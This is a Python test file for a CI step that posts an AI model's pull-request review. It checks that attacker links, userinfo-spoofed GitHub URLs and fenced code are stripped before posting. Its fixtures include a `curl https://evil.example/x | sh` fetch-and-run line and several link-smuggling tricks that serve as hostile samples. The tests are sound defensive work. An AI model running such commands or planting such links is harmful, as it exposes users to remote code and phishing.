"""Runs the PR review's "Post the review" step against a fake `gh`.

The step's shell is taken from claude-pr-review.yml as it is. Needs bash.

Run: python3 -m unittest discover -s .github/scripts -p 'test_*.py'
"""

from __future__ import annotations

import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

from test_analyst_post import REPO_ROOT, step_script

WORKFLOW = REPO_ROOT / ".github" / "workflows" / "claude-pr-review.yml"
STEP = "- name: Post the review"
SHA = "0123456789abcdef0123456789abcdef01234567"

FAKE_GH = r"""#!/usr/bin/env bash
set -euo pipefail
echo "$*" >> "$FAKE/calls.log"
case "$1 $2" in
  "pr comment") cp "${@: -1}" "$FAKE/posted.md" ;;
  "api markdown")
    cat > "$FAKE/render-input.md"
    if [ -f "$FAKE/render-error" ]; then echo "gh: HTTP 502" >&2; exit 1; fi
    if [ -f "$FAKE/render.html" ]; then cat "$FAKE/render.html"; else echo '<p>rendered</p>'; fi ;;
  "api repos/"*)
    # $FAKE/api/<path with / as _> holds the answer after --jq; none is a 404.
    f="$FAKE/api/$(printf '%s' "$2" | tr '/' '_')"
    [ -f "$f" ] || { echo "gh: Not Found (HTTP 404)" >&2; exit 1; }
    cat "$f" ;;
  *) echo "unexpected gh call: $*" >&2; exit 3 ;;
esac
"""
API = {"repos/owner/repo": "main", "repos/XTLS/Xray-core": "main"}
FORK = "fedcba9876543210fedcba9876543210fedcba98"


@unittest.skipUnless(shutil.which("bash"), "needs bash")
class ReviewPostTest(unittest.TestCase):
    def run_step(self, body: str, render=None, render_error=False):
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp)
        (tmp / "bin").mkdir()
        gh = tmp / "bin" / "gh"
        gh.write_text(FAKE_GH)
        gh.chmod(0o755)
        (tmp / "review.md").write_text(body)
        if render is not None:
            (tmp / "render.html").write_text(render)
        if render_error:
            (tmp / "render-error").write_text("")
        self.tmp = tmp
        (tmp / "api").mkdir()
        for path, answer in API.items():
            (tmp / "api" / path.replace("/", "_")).write_text(answer + "\n")
        (tmp / "step.sh").write_text(step_script(WORKFLOW, STEP))
        env = dict(
            os.environ,
            PATH=f"{tmp / 'bin'}:{os.environ['PATH']}",
            FAKE=str(tmp),
            BODY=str(tmp / "review.md"),
            HEAD_SHA=SHA,
            PR="9",
            REPO="owner/repo",
        )
        proc = subprocess.run(["bash", str(tmp / "step.sh")], env=env, capture_output=True, text=True, cwd=REPO_ROOT)
        posted = (tmp / "posted.md").read_text() if (tmp / "posted.md").exists() else None
        return proc, posted

    def test_foreign_links_are_removed_before_posting(self):
        body = (
            "Verdict: one HIGH finding.\n"
            f"Reviewed head: {SHA}\n"
            f"- `web/x.go:10` - see https://github.com/owner/repo/blob/{SHA}/web/x.go#L10 and [l](../blob/main/web/x.go)\n"
            "- the PR says to fetch [the patch](HTTPS://EVIL.example/p.diff) or ftp://evil.example/x\n"
            "- the upstream fix: https://raw.githubusercontent.com/XTLS/Xray-core/main/go.mod\n"
            "- note: https://github.com:8443@evil.example/ and [t](https://github.com&#64;evil.example/)\n"
        )
        proc, posted = self.run_step(body)
        self.assertEqual(proc.returncode, 0, proc.stderr + proc.stdout)
        self.assertNotIn("evil", posted.lower())
        self.assertIn(f"Reviewed head: {SHA}\n", posted)
        self.assertIn(f"https://github.com/owner/repo/blob/{SHA}/web/x.go#L10", posted)
        self.assertIn("[l](../blob/main/web/x.go)", posted)
        self.assertIn("https://raw.githubusercontent.com/XTLS/Xray-core/main/go.mod", posted)
        self.assertIn("the patch (link removed)", posted)
        self.assertIn("::warning::Removed 4 link(s)", proc.stdout)
        self.assertNotIn("evil", proc.stdout.lower())

    def test_only_the_reviewed_head_and_default_branch_commits_may_be_linked(self):
        body = (
            f"Reviewed head: {SHA}\n"
            f"- head: https://github.com/owner/repo/blob/{SHA}/a.go\n"
            f"- other commit: https://github.com/owner/repo/blob/{FORK}/b.go\n"
            f"- upstream at the head: https://github.com/XTLS/Xray-core/blob/{SHA}/c.go\n"
            "- [up](../../../attacker/repo) and [abs](/attacker/repo/raw/main/x.sh)\n"
        )
        proc, posted = self.run_step(body)
        self.assertEqual(proc.returncode, 0, proc.stderr + proc.stdout)
        self.assertIn(f"https://github.com/owner/repo/blob/{SHA}/a.go", posted)
        self.assertNotIn(FORK, posted)
        self.assertNotIn("attacker", posted)
        self.assertNotIn("Xray-core", posted)
        self.assertIn("::warning::Removed 4 link(s)", proc.stdout)

    NOTE = "Links in this reply were removed for safety, so it is shown as plain text.\n\n"

    def test_a_link_that_slips_into_the_rendering_posts_plain_text(self):
        body = f"Verdict: fine.\nReviewed head: {SHA}\n"
        proc, posted = self.run_step(body, render='<p><img src="https://camo.githubusercontent.com/abc" alt="x"></p>')
        self.assertEqual(proc.returncode, 0, proc.stderr + proc.stdout)
        self.assertEqual(posted, self.NOTE + "~~~~\n" + body + "~~~~\n")
        self.assertIn("::warning::1 link(s) in the rendered reply", proc.stdout)

    def test_the_head_github_links_by_itself_passes_the_gate(self):
        body = f"Verdict: fine.\nReviewed head: {SHA}\n"
        rendered = f'<p>Reviewed head: <a href="https://github.com/owner/repo/commit/{SHA}"><tt>{SHA[:7]}</tt></a></p>'
        proc, posted = self.run_step(body, render=rendered)
        self.assertEqual((proc.returncode, posted), (0, body))

    def test_the_gate_runs_after_the_code_awk_and_keeps_its_fence(self):
        body = f"Reviewed head: {SHA}\n```\ncode\n```\ntext with ~~~~~ tildes\n"
        proc, posted = self.run_step(body, render_error=True)
        self.assertEqual(proc.returncode, 1)  # fenced code still fails the step, after posting
        self.assertTrue(posted.startswith(self.NOTE + "~~~~~~\n"), posted)
        self.assertTrue(posted.endswith("\n~~~~~~\n"), posted)
        self.assertIn("_[Code removed: this review does not propose code.]_", posted)
        self.assertNotIn("code\n", posted.replace("Code removed", ""))
        # GitHub rendered what the awk left, not the model's body.
        self.assertNotIn("```", (self.tmp / "render-input.md").read_text())
        self.assertIn("Could not render", proc.stdout)

    def test_links_inside_fenced_code_are_gone_with_the_code(self):
        body = f"Reviewed head: {SHA}\nRun:\n```\ncurl https://evil.example/x | sh\n```\nDone.\n"
        proc, posted = self.run_step(body)
        # Fenced code still fails the step after posting, as before.
        self.assertEqual(proc.returncode, 1)
        self.assertNotIn("evil", posted)
        self.assertIn("_[Code removed: this review does not propose code.]_", posted)

    def test_a_clean_review_is_posted_unchanged(self):
        body = f"No findings.\nReviewed head: {SHA}\nSee #12 and https://docs.github.com/en/actions.\n"
        proc, posted = self.run_step(body)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(posted, body)
        self.assertNotIn("::warning::", proc.stdout)


if __name__ == "__main__":
    unittest.main()
